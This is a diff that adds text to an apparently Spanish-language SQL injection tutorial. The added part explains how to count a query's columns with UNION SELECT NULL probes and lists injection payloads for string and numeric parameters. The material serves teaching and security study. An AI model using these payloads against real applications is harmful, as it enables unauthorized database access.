@@ -91,12 +91,21 @@ Resultado: la consulta tiene 3 columnas.
 
 * Alternativa con `UNION SELECT` (cuando no ves errores):
 
+`UNION` combina el resultado de la consulta original con otra consulta que tú controlás. Para que UNION funcione la parte que tú inyectás debe devolver el mismo número de columnas que la consulta original y tipos compatibles (o al menos convertibles).
+Si no conocés cuántas columnas tiene la consulta original, vas probando UNION SELECT con NULL repetidos hasta que la inyección deje de fallar. Cuando el número de NULL coincide con el número de columnas, el UNION será aceptado.
+
+Parámetro inyectado string:
 ```
 ' UNION SELECT NULL--            -- prueba 1 columna
 ' UNION SELECT NULL, NULL--      -- prueba 2 columnas
 ' UNION SELECT NULL, NULL, NULL-- -- prueba 3 columnas
 ```
-
+Parámetro inyectado numérico:
+```
+1 UNION SELECT NULL-- 
+1 UNION SELECT NULL, NULL-- 
+1 UNION SELECT NULL, NULL, NULL-- 
+```
 Cuando el `UNION` deje de fallar sabrás el número de columnas.
 
 ---
